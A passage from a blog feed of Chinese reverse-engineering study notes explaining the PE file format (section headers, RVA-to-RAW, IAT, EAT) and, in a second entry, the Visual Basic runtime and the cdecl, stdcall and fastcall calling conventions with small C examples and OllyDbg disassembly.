data</span><br><span class="line">00000218 00000000 offset to relocations</span><br><span class="line">0000021C 00000000 offset to line numbers</span><br><span class="line">00000220     0000 number of relocations</span><br><span class="line">00000222     0000 number of line numbers</span><br><span class="line">00000224 C0000040 characteristics</span><br><span class="line">                    IMAGE_SCN_CNT_INITIALIZED_DATA</span><br><span class="line">                    IMAGE_SCN_MEM_READ</span><br><span class="line">                    IMAGE_SCN_MEM_WRITE</span><br><span class="line"></span><br><span class="line">00000228 2E727372 Name (.rsrc)</span><br><span class="line">0000022C 63000000</span><br><span class="line">00000230 00008304 virtual size</span><br><span class="line">00000234 0000B000 RVA</span><br><span class="line">00000238 00008400 size of raw data</span><br><span class="line">0000023C 00008400 offset to raw data</span><br><span class="line">00000240 00000000 offset to relocations</span><br><span class="line">00000244 00000000 offset to line numbers</span><br><span class="line">00000248     0000 number of relocations</span><br><span class="line">0000024A     0000 number of line numbers</span><br><span class="line">0000024C 40000040 characteristics</span><br><span class="line">                    IMAGE_SCN_CNT_INITIALIZED_DATA</span><br><span class="line">                    IMAGE_SCN_MEM_READ</span><br></pre></td></tr></table></figure><blockquote><p>讲解 PE 文件时经常出现 “映像” （Image）这一术语。PE 文件加载到内存时，文件不会原封不动地加载，而要根据节区头中定义的节区起始地址、节区大小等加载。因此，磁盘文件中的 PE 与内存中的 PE 具有不同形态。将装载到内存中的形态称为 “映像” 以示区别。</p></blockquote><h2 id="RVA-to-RAW"><a href="#RVA-to-RAW" class="headerlink" title="RVA to RAW"></a>RVA to RAW</h2><p>PE 文件加载到内存时，每个节区都要能准确完成内存骶椎与文件偏移间的映射。这种映射一般称为 RVA to RAW，方法如下。</p><ol><li>查找 RVA 所在节区。</li><li>使用简单的公式计算文件偏移（RAW）。</li></ol><p>根据 <code>IMAGE_SECTION_HEADER</code> 结构体，换算公式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RAW - PointerToRawData = RVA - VirtualAddress</span><br><span class="line">                   RAW = RVA - VirtualAddress + PointerToRawData</span><br></pre></td></tr></table></figure><h2 id="IAT"><a href="#IAT" class="headerlink" title="IAT"></a>IAT</h2><p>IAT（Import Address Table，导入地址表）保存的内容与 Windows 操作系统的核心进程、内存、DLL 结构等有关。换句话说，只要理解了 IAT，就掌握了 Windows 操作系统的根基。简言之 IAT 是一种表格，用来记录程序正在使用哪些库中的哪些函数。</p><blockquote><p>RVA 与 RAW（文件偏移）间的相互变换是 PE 头的最基本的内容。</p></blockquote><h3 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h3><p>DLL（Dynamic Linked Library）撑起了整座 Windows OS 大厦，它被翻译成 “动态链接库”。</p><p>16 位的 DOS 时代不存在 DLL 这一概念，只有 “库”（Library）一说。比如在 C 语言中使用 <code>printf()</code> 函数时，编译器会先从 C 库中读取相应函数的二进制代码，然后插入（包含到）应用程序。也就是说，可执行文件中包含着 <code>printf()</code> 函数的二进制代码。Windows OS 支持多任务，若仍采用这种包含库的方式，会非常没有效率。Windows 操作系统使用了数量庞大的库函数（进程、内存、窗口、消息等）来支持 32 位的 Windows 环境。同时运行多个程序时，若仍像以前一样每个程序运行时都包含相同的库，将造成严重的内存浪费（当然磁盘空间的浪费也不容小嘘）。因此，Windows OS 设计者们根据需要引入了 DLL 这一概念，描述如下。</p><ul><li>不要把库包含到程序中，单独组成 DLL 文件，需要时调用即可。</li><li>内存映射技术使加载后的 DLL 代码、资源在多个进程中实现共享。</li><li>更新库时只要替换相关 DLL 文件即可，简便易行。</li></ul><p>加载 DLL 的方式实际有两种：一种是 “显式链接”（Explicit Linking），程序使用 DLL 时加载，使用完毕后释放内存；另一种是 “隐式链接”（Implicit Linking），程序开始时即一同加载 DLL，程序终止时再释放占用的内存。IAT 提供的机制即与隐式链接有关。接下来用 OllyDbg 打开 <code>notepad.exe</code> 来查看 IAT，下图是 <code>CreateFileW()</code> 函数的代码，该函数位于 kernel32.dll 中。</p><p><img src="/pics/BIN集训/RE/三/9.png" alt="调用 CreateFileW() 函数的代码"></p><p>调用 <code>CreateFileW()</code> 函数时并非直接调用，而是通过获取 01001104 地址处的值来实现（所有 API 调用均采用这种方式）。</p><p>地址 01001104 是 <code>notepad.exe</code> 中 <code>.text</code> 节区的内存区域（更确切地说是 IAT 内存区域）。01001104 地址的值为 7C8107F0，而 7C8107F0 地址即是加载到 <code>notepad.exe</code> 进程内存中的 <code>CreateFileW()</code> 函数（位于 kernel32.dll 库中）的地址。</p><p>那么为什么不直接 <code>CALL 7C8107F0</code> 呢？事实上，<code>notepad.exe</code> 程序的制作者编译（生成）程序时，并不知道该 <code>notepad.exe</code> 程序运行在哪种 Windows（9X、2K、XP、Vista、7 等）、哪种语言（ENG、JPN、KOR 等）、哪种服务包（Service Pack）下。上面列举出的所有环境中，kernel32.dll 的版本各不相同，<code>CreateFileW()</code> 函数的位置（地址）也不相同。为了确保在所有环境中都能正常地调用 <code>CreateFileW()</code> 函数，编译器准备了要保存 <code>CreateFileW()</code> 函数实际地址的位置（01001104），并记下 <code>CALL DWORD PTR DS:[01001104]</code> 形式的指令。执行文件时，PE 装载器将 <code>CreateFileW()</code> 函数的地址写到 01001104 位置。</p><p>编译器不使用 <code>CALL 7C8107F0</code> 语句的另一个原因在于 DLL 重定位。DLL 文件的 ImageBase 值一般为 10000000。比如某个程序使用 a.dll 与 b.dll 时，PE 装载器先把 a.dll 装载到内存的 10000000（ImageBase）处，然后尝试把 b.dll 也装载到该处。但是由于该地址处已经装载了 a.dll，所以 PE 装载器查找其他空白的内存空间（ex：3E000000），然后将 b.dll 装载进去。</p><p>这就是所谓的 DLL 重定位，它使我们无法对实际地址硬编码。另一个原因在于，PE 头中表示地址时不使用 VA，而是 RVA。</p><blockquote><p>实际操作中无法保证 DLL 一定会被加载到 PE 头内指定的 ImageBase 处。但是 EXE 文件（生成进程的主体）却能准确加载到自身的 ImageBase 中，因为它拥有自己的虚拟空间。</p></blockquote><p>PE 头的 IAT 是代码逆向分析的核心内容。</p><h3 id="IMAGE-IMPORT-DESCRIPTOR"><a href="#IMAGE-IMPORT-DESCRIPTOR" class="headerlink" title="IMAGE_IMPORT_DESCRIPTOR"></a>IMAGE_IMPORT_DESCRIPTOR</h3><p><code>IMAGE_IMPORT_DESCRIPTOR</code> 结构体中记录着 PE 文件要导入哪些库文件。</p><blockquote><p>Import：导入，向库提供服务（函数）。<br>Export：导出，从库向其他 PE 文件提供服务（函数）。</p></blockquote><p><code>IMAGE_IMPORT_DESCRIPTOR</code> 结构体如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristiics;</span><br><span class="line">        DWORD   OriginalFirstThunk;     <span class="comment">// INT(Import Name Table) address (RVA)</span></span><br><span class="line">    &#125;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   ForwarderChain;</span><br><span class="line">    DWORD   Name;                       <span class="comment">// library name string address (RVA)</span></span><br><span class="line">    DWORD   FirstThunk;                 <span class="comment">// IAT(Import Address Table) address (RVA)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORTBY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;                       <span class="comment">// ordinal</span></span><br><span class="line">    BYTE    Name[<span class="number">1</span>];                    <span class="comment">// function name string</span></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p>执行一个普通程序时往往需要导入多个库，导入多少库就存在多少个 <code>IMAGE_IMPORT_DESCRIPTOR</code> 结构体，这些结构体形成了数组，且结构体数组最后以 NULL 结构体结束。<code>IMAGE_IMPORT_DESCRIPTOR</code> 中重要的成员如下表所示（拥有全部 RVA 值）。</p><table><thead><tr><th style="text-align:center">项目</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">OriginalFirstThunk</td><td style="text-align:center">INT 的地址（RVA）</td></tr><tr><td style="text-align:center">Name</td><td style="text-align:center">库名称字符串的地址（RVA）</td></tr><tr><td style="text-align:center">FirstThunk</td><td style="text-align:center">IAT 的地址（RVA）</td></tr></tbody></table><blockquote><p>PE 头中提到的 “Table” 即指数组。<br>INT 与 IAT 是长整型（4 个字节数据类型）数组，以 NULL 结束（未另外明确指出大小）。<br>INT 中各元素的值为 IMAGE_IMPORT_BY_NAME 结构体指针（有时 IAT 也拥有相同的值）。<br>INT 与 IAT 的大小应相同。</p></blockquote><p>下图为 <code>notepad.exe</code> 之 kernel32.dll 的 <code>IMAGE_IMPORT_DESCRIPTOR</code> 结构。</p><p><img src="/pics/BIN集训/RE/三/10.png" alt="IAT"></p><p>INT 与 IAT 的各元素同时指向相同地址，但也有很多情况下它们是不一致的。</p><p>下面为 PE 装载器把导入函数输入之 IAT 的顺序。</p><ol><li>读取 IID 的 Name 成员，获取库名称字符串（“kernel32.dll”）。</li><li>装载相应库。-&gt; <code>LoadLibrary(&quot;kernel32.dll&quot;)</code></li><li>读取 IID 的 OriginialFirstThunk 成员，获取 INT 地址。</li><li>逐一读取 INT 中数组的值，获取相应 IMAGE_IMPORT_BY_NAME 地址（RVA）。</li><li>使用 IMAGE_IMPORT_BY_NAME 的 Hint（ordinal）或 Name 项，获取相应函数的起始地址。-&gt; <code>GetProcAddress(&quot;GetCurrentThreadld&quot;)</code></li><li>读取 IID 的 FirstThunk（IAT）成员，获得 IAT 地址。</li><li>将上面获得的函数地址输入相应 IAT 数组值。</li><li>重复以上步骤 4~7，直到 INT 结束（遇到 NULL 时）。</li></ol><h2 id="EAT"><a href="#EAT" class="headerlink" title="EAT"></a>EAT</h2><p>Windows 操作系统中，“库” 是为了方便其他程序调用而集中包含相关函数的文件（DLL/SYS）。Win32 API 是最具代表性的库，其中的 kernel32.dll 文件被称为最核心的库文件。</p><p>EAT 是一种核心机制，它使不同应用程序可以调用库文件中提供的函数。也就是说，只有通过 EAT 才能准确求得从相应库中导出函数的起始地址。与 IAT 一样，PE 文件内的特定结构体（<code>IMAGE_EXPORT_DIRECTORY</code>）保存着导出信息，且 PE 文件中仅有一个用来说明库 EAT 的 <code>IMAGE_EXPORT_DIRECTORY</code> 结构体。</p><blockquote><p>用来说明 IAT 的 IMAGE_IMPORT_DESCRIPTOR 结构体以数组形式存在，且拥有多个成员。这样是因为 PE 文件可以同时导入多个库。</p></blockquote><p>可以在 PE 文件的 PE 头查找到 <code>IMAGE_EXPORT_DIRECTORY</code> 结构体的位置。<code>IMAGE_OPTIONAL_HEADER32.DataDirectory[0].VirtualAddress</code> 值即是 <code>IMAGE_EXPORT_DIRECTORY</code> 的起始地址（也是 RVA 的值）。</p><p>下图显示的是 kernel32.dll 文件的 <code>IMAGE_OPTIONAL_HEADER32.DataDirectory[0]</code>（第一个 4 字节为 VirtualAddress，第二个 4 字节为 Size 成员）。</p><p><img src="/pics/BIN集训/RE/三/11.png" alt="IMAGE_OPTIONAL_HEADER32.DataDirectory[0]"></p><p><code>IMAGE_OPTIONAL_HEADER32.DataDirectory</code> 结构体数组信息整理如下表。</p><table><thead><tr><th style="text-align:center">偏移</th><th style="text-align:center">值</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">00000160</td><td style="text-align:center">00000000</td><td style="text-align:center">loader flags</td></tr><tr><td style="text-align:center">00000164</td><td style="text-align:center">00000010</td><td style="text-align:center">number of directories</td></tr><tr><td style="text-align:center">00000168</td><td style="text-align:center">0000262C</td><td style="text-align:center">RVA of EXPORT Directory</td></tr><tr><td style="text-align:center">0000016C</td><td style="text-align:center">00006D19</td><td style="text-align:center">size of EXPORT Directory</td></tr><tr><td style="text-align:center">00000170</td><td style="text-align:center">00081898</td><td style="text-align:center">RVA of IMPORT Directory</td></tr><tr><td style="text-align:center">00000174</td><td style="text-align:center">00000028</td><td style="text-align:center">size of IMPORT Directory</td></tr></tbody></table><p>由于 RVA 值为 262C，所以文件偏移为 1A2C。</p><h3 id="IMAGE-EXPORT-DIRECTORY"><a href="#IMAGE-EXPORT-DIRECTORY" class="headerlink" title="IMAGE_EXPORT_DIRECTORY"></a>IMAGE_EXPORT_DIRECTORY</h3><p><code>IMAGE_EXPORT_DIRECTORY</code> 结构体如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWROD   TimeDateStamp;          <span class="comment">// creation time date stamp</span></span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;                   <span class="comment">// address of library file name</span></span><br><span class="line">    DWORD   Base;                   <span class="comment">// ordinal base</span></span><br><span class="line">    DWORD   NumberOfFunctions;      <span class="comment">// number of functions</span></span><br><span class="line">    DWORD   NumberOfNames;          <span class="comment">// number of names</span></span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// address of function start address array</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// address of function name string array</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// address of ordinal array</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>下表为其中的重要成员（全部地址均为 RVA）。</p><table><thead><tr><th style="text-align:center">项目</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">NumberOfFunctions</td><td style="text-align:center">实际 Export 函数的个数</td></tr><tr><td style="text-align:center">NumberOfNames</td><td style="text-align:center">Export 函数中具名的函数个数</td></tr><tr><td style="text-align:center">AddressOfFunctions</td><td style="text-align:center">Export 函数地址数组（数组元素个数=AddressOfFunctions）</td></tr><tr><td style="text-align:center">AddressOfNames</td><td style="text-align:center">函数名称地址数组（数组元素个数=AddressOfNames）</td></tr><tr><td style="text-align:center">AddressOfNameOrdinals</td><td style="text-align:center">Ordinal 地址数组（数组元素个数=AddressOfNames）</td></tr></tbody></table><p>下图是 kernel32.dll 文件的 <code>IMAGE_EXPORT_DIRECTORY</code> 结构体与整个 EAT 结构。</p><p><img src="/pics/BIN集训/RE/三/12.jpeg" alt="EAT"></p><p>从库中获得函数地址的 API 为 <code>GetProcAddress()</code> 函数。该 API 引用 EAT 来获取指定 API 的地址。<code>GetProcAddress()</code> API 拥有函数名称，以下为它获取函数地址的过程。</p><ol><li>利用 AddressOfNames 成员转到 “函数名称数组”。</li><li>“函数名称数组” 中存储着字符串地址。通过比较（strcmp）字符串，查找指定的函数名称（此时数组的索引称为 name_index）。</li><li>利用 AddressOfNameOrdinals 成员，转到 ordinal 数组。</li><li>在 ordinal 数组中通过 name_index 查找相应的 ordinal 值。</li><li>利用 AddressOfFunctions 成员转到 “函数地址数组”（EAT）。</li><li>在 “函数地址数组” 中将刚刚求得的 ordinal 用作数组索引，获得指定函数的起始地址。</li></ol><p>kernel32.dll 中所有导出函数均有相应名称，AddressOfNameOrdinals 数组的值以 index=ordinal 的形式存在。但并不是所有的 DLL 文件都如此。导出函数中也有一些函数没有名称（仅通过 ordinal 导出），AddressOfNameOrdinals 数组的值为 index!=ordinal。所以只有按照上面的顺序才能获得准确的函数地址。</p><blockquote><p>对于没有函数名称的导出函数，可以通过 Ordinal 查找到它们的地址。从 Ordinal 值中减去 IMAGE_EXPORT_DIRECTORY.Base 成员后得到一个值，使用该值作为 “函数地址数组” 的索引，即可查找到相应函数的地址。</p></blockquote><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://reversecore.com/" target="_blank" rel="noopener">《逆向工程核心原理》</a><br><a href="https://bbs.pediy.com/thread-247114.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247114.htm</a><br><a href="https://bbs.pediy.com/thread-247303.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247303.htm</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;摘自&lt;a href=&quot;https://reversecore.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;《逆向工程核心原理》&lt;/a&gt;中关于 Windows 操作系统的 PE（Portable Executable）文件格式的部分，其中也有关于进程、内存、DLL 等的内容，它们是 Windows 操作系统中最核心的部分。&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>RE入门（二）</title>
    <link href="https://qianfei11.github.io/2019/08/27/RE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://qianfei11.github.io/2019/08/27/RE入门（二）/</id>
    <published>2019-08-27T03:54:09.000Z</published>
    <updated>2019-08-30T03:01:57.757Z</updated>
    
    <content type="html"><![CDATA[<p>了解一些 VB 的特性以及一些简单的的函数调用约定。</p><a id="more"></a><h1 id="Visual-Basic"><a href="#Visual-Basic" class="headerlink" title="Visual Basic"></a>Visual Basic</h1><h2 id="VB-专用引擎"><a href="#VB-专用引擎" class="headerlink" title="VB 专用引擎"></a>VB 专用引擎</h2><p>VB 文件使用名为<code>MSVBVM60.dll</code>（Microsoft Visual Basic Machine 6.0）的 VB 专用引擎（也称为 The Thunder Runtime Engine）。</p><p>举个使用 VB 引擎的例子，显示消息框时，VB 代码中要调用<code>MsgBox()</code>函数。其实，VB 编辑器真正调用的是<code>MSVBVM60.dll</code>里的<code>rtcMsgBox()</code>函数，在该函数内部通过调用<code>user32.dll</code>里的<code>MessageBoxW()</code>函数（Win32 API）来工作（也可以在 VB 代码中直接调用<code>user32.dll</code>里的<code>MessageBoxW()</code>）。</p><h2 id="本地代码和伪代码"><a href="#本地代码和伪代码" class="headerlink" title="本地代码和伪代码"></a>本地代码和伪代码</h2><p>根据使用的编译选项的不同，VB 文件可以编译为本地代码（N code）与伪代码（P code）。本地代码一般使用易于调试器解析的 IA-32 指令；而伪代码是一种解释器（Interpreter）语言，它使用由 VB 引擎实现虚拟机并可自解析的指令（字节码）。因此，若想准确解析 VB 的伪代码，就需要分析 VB 引擎并实现模拟器。</p><p>伪代码具有与 Java（Java 虚拟机）、Python（Python 专用引擎）类似的形态结构。使用伪代码的好处是非常方便代码移植（编写/发布针对特定平台的引擎，用户代码借助它几乎可以不加任何修改地在制定平台上运行）。</p><h2 id="事件处理程序"><a href="#事件处理程序" class="headerlink" title="事件处理程序"></a>事件处理程序</h2><p>VB 主要来编写 GUI 程序，IDE 用户界面本身也最适合于 GUI 编程。由于 VB 程序采用 Windows 操作系统的事件驱动方式工作，所以在<code>main()</code>或<code>WinMain()</code>中并不存在用户代码（希望调试的代码），用户代码存在于各个事件处理程序（event handler）之中。</p><h1 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h1><h2 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h2><p><code>cdecl</code>是主要在 C 语言中使用的方式，调用者负责处理栈。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (a + b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> add(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 VC++（关闭优化选项）编译代码生成<code>cdecl.exe</code>，使用 OllyDbg 调试。</p><p>从 401000~401020 地址间的代码可以发现，<code>add()</code>函数的参数 1、2 以逆序的方式入栈，调用<code>add()</code>函数（401000）后，使用<code>ADD ESP,8</code>命令整理栈。调用者<code>main()</code>函数直接清理其压入栈的函数参数，这样的方式是<code>cdecl</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">00401000  /$  55            PUSH EBP                                 ;  # add</span><br><span class="line">00401001  |.  8BEC          MOV EBP,ESP</span><br><span class="line">00401003  |.  8B45 08       MOV EAX,[ARG.1]</span><br><span class="line">00401006  |.  0345 0C       ADD EAX,[ARG.2]</span><br><span class="line">00401009  |.  5D            POP EBP</span><br><span class="line">0040100A  \.  C3            RETN</span><br><span class="line">0040100B      CC            INT3</span><br><span class="line">0040100C      CC            INT3</span><br><span class="line">0040100D      CC            INT3</span><br><span class="line">0040100E      CC            INT3</span><br><span class="line">0040100F      CC            INT3</span><br><span class="line">00401010  /$  55            PUSH EBP                                 ;  # main</span><br><span class="line">00401011  |.  8BEC          MOV EBP,ESP</span><br><span class="line">00401013  |.  6A 02         PUSH 0x2                                 ;  / Arg2 = 00000002</span><br><span class="line">00401015  |.  6A 01         PUSH 0x1                                 ;  | Arg1 = 00000001</span><br><span class="line">00401017  |.  E8 E4FFFFFF   CALL cdecl.00401000                      ;  \ cdecl.00401000</span><br><span class="line">0040101C  |.  83C4 08       ADD ESP,0x8</span><br><span class="line">0040101F  |.  5D            POP EBP</span><br><span class="line">00401020  \.  C3            RETN</span><br></pre></td></tr></table></figure><p><code>cdecl</code>方式的好处在于它可以像 C 语言的<code>printf()</code>函数一样，向被调用函数传递长度可变的参数。这种长度可变的参数在其他调用约定中很难实现。</p><h1 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h1><p><code>stdcall</code>方式常用于 Win32 API，该方式由被调用者清理栈。C 语言默认的函数调用方式为<code>cdecl</code>。若想使用<code>stdcall</code>方式编译源码，只要使用<code>_stdcall</code>关键字即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _<span class="function">stdcall <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (a + b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> add(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 VC++（关闭优化选项）编译代码生成<code>stdcall.exe</code>文件后，使用 OllyDbg 调试。从代码中可以看到，在<code>main()</code>函数中调用<code>add()</code>函数后，省略了清理栈的代码（<code>ADD ESP,8</code>）。</p><p>栈的清理工作由<code>add()</code>函数中最后（40100A）的<code>RETN 8</code>命令来执行。<code>RETN 8</code>命令的含义为 RETN+POP 8 字节，即返回后使 ESP 增加到指定大小。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00401000  /$  55            PUSH EBP                                 ;  # add</span><br><span class="line">00401001  |.  8BEC          MOV EBP,ESP</span><br><span class="line">00401003  |.  8B45 08       MOV EAX,[ARG.1]</span><br><span class="line">00401006  |.  0345 0C       ADD EAX,[ARG.2]</span><br><span class="line">00401009  |.  5D            POP EBP</span><br><span class="line">0040100A  \.  C2 0800       RETN 0x8</span><br><span class="line">0040100D      CC            INT3</span><br><span class="line">0040100E      CC            INT3</span><br><span class="line">0040100F      CC            INT3</span><br><span class="line">00401010  /$  55            PUSH EBP                                 ;  # main</span><br><span class="line">00401011  |.  8BEC          MOV EBP,ESP</span><br><span class="line">00401013  |.  6A 02         PUSH 0x2                                 ;  / Arg2 = 00000002</span><br><span class="line">00401015  |.  6A 01         PUSH 0x1                                 ;  | Arg1 = 00000001</span><br><span class="line">00401017  |.  E8 E4FFFFFF   CALL stdcall.00401000                    ;  \ stdcall.00401000</span><br><span class="line">0040101C  |.  5D            POP EBP</span><br><span class="line">0040101D  \.  C3            RETN</span><br></pre></td></tr></table></figure><p>像这样在被调用者<code>add()</code>函数内部清理栈的方式即为<code>stdcall</code>方式。<code>stdcall</code>方式的好处在于，被调用者函数内部存在着栈清理代码，与每次调用函数时都要用<code>ADD ESP,XXX</code>命令的<code>cdecl</code>方式相比，代码尺寸要小。虽然 Win32 API 是使用语言编写的库，但它使用的是<code>stdcall</code>方式，而不是 C 语言默认的<code>cdecl</code>方式。这是为了更好的兼容性，使 C 语言之外的其他语言（Delphi（Pascall）、Visual Basic 等）也能直接调用 API。</p><h1 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h1><p><code>fastcall</code>方式与<code>stdcall</code>方式基本类似，但该方式通常会使用寄存器（而非栈内存）去传递那些需要传递给函数的部分参数（前 2 个）。若某函数有 4 个参数，则前 2 个参数分别使用 ECX、EDX 寄存器传递。</p><p>顾名思义，<code>fastcall</code>方式的优势在于可以实现对函数的快速调用（从 CPU 的立场看，访问寄存器的速度要远比内存快得多）。单从函数调用本身来看，<code>fastcall</code>方式非常快，但是有时需要额外的系统开销来管理 ECX、EDX 寄存器。倘若调用函数前 ECX 与 EDX 中存有重要数据，那么使用它们前必须先备份。此外，如果函数本身很复杂，需要 ECX、EDX 寄存器用作其他用途时，也需要将它们中的参数值存储到另外某个地方。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://reversecore.com/" target="_blank" rel="noopener">《逆向工程核心原理》</a><br><a href="https://www.jianshu.com/p/85a76f630c95" target="_blank" rel="noopener">https://www.jianshu.com/p/85a76f630c95</a><br><a href="https://bbs.pediy.com/thread-224583.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-224583.htm</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;了解一些 VB 的特性以及一些简单的的函数调用约定。&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>杭电CTF-题库-reverse</title>
    <link href="https://qianfei11.github.io/2019/08/24/%E6%9D%AD%E7%94%B5CTF-%E9%A2%98%E5%BA%93-reverse/"/>
    <id>https://qianfei11.github.io/2019/08/24/杭电CTF-题库-reverse/</id>
    <published>2019-08-24T03:33:30.000Z</published>
    <updated>2019-08-28T05:01:31.376Z</updated>
    
